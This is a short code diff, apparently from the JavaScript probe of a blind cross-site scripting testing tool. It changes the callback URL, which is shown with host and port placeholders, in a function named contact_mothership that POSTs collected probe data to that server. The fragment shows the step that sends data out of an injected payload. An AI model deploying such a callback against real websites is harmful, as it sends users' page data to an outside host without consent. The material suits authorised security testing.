@@ -238,7 +238,7 @@ let contact_mothership = async function(probe_return_data, pgp_key) {
     }
 
     var http = new XMLHttpRequest();
-    var url = "[HOST_URL]/js_callback";
+    var url = "[HOST_URL]:[HOST_PORT]/js_callback";
     http.open("POST", url, true);
     http.onreadystatechange = function() {
         if(http.readyState == 4 && http.status == 200) {
